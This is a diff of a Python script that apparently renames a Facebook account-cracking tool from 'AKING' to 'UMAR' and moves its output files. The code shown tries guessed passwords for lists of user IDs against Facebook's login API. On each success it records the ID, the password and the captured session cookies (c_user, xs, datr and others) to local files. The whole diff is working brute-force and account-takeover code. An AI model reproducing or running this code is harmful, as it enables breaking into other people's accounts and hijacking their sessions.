@@ -329,7 +329,7 @@ def rnd():
 def m1(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [UMAR-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -358,11 +358,11 @@ def m1(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [UMAR-OK] '+ids+' | '+pas)
 				oks.append(ids)
 				open('/sdcard/AKING/AKING-M1-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Cyber/Cyber-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -372,7 +372,7 @@ def m1(ids,names,passlist,fbcr):
 def m2(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [UMAR-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -401,18 +401,18 @@ def m2(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [UMAR-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/Cyber/Cyber-M2-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Cyber/Cyber-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 			'''elif 299==random.randint(1,300):
 				oks.append(ids)
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
-			#	open('/sdcard/AKING/AKING-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [UMAR-OK] '+ids+' | '+pas)
+			#	open('/sdcard/Cyber/Cyber-M2-OK.txt','a').write(ids+'|'+pas+'\n')
 				#cookie = 'Error'
-				#open('/sdcard/AKING/AKING-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				#open('/sdcard/Cyber/Cyber-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break'''
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -422,7 +422,7 @@ def m2(ids,names,passlist,fbcr):
 def m3(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [UMAR-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -437,11 +437,11 @@ def m3(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [UMAR-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-M3-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/Cyber/Cyber-M3-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Cyber/Cyber-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -473,11 +473,11 @@ def rd(ids,passlist,fbcr):
 			if "session_key" in po:
 				uid = str(po['uid'])
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas)
+				print('\r\r\033[1;32m [UMAR-OK] '+uid+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-R-OK.txt','a').write(uid+'|'+pas+'\n')
+				open('/sdcard/Cyber/Cyber-R-OK.txt','a').write(uid+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/Cyber/Cyber-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
